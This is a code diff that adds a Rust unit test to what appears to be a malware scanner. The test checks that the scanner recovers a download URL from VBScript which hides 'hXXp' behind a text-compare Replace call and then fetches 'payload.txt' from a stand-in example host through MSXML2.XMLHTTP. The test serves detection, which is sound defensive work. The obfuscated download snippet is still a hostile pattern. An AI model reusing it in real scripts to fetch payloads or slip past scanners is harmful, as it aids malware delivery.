@@ -10888,6 +10888,28 @@ http.Send"#;
     }
 
     #[test]
+    fn vbs_xmlhttp_url_extracted_from_textcompare_replace_wrapper() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u, http
+u = Replace("hXXp://vbs-textcompare-replace.example/payload.txt", "xx", "tt", 1, -1, vbTextCompare)
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-textcompare-replace.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS text-compare Replace URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_xmlhttp_url_extracted_from_mid_wrapper() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Dim u, http
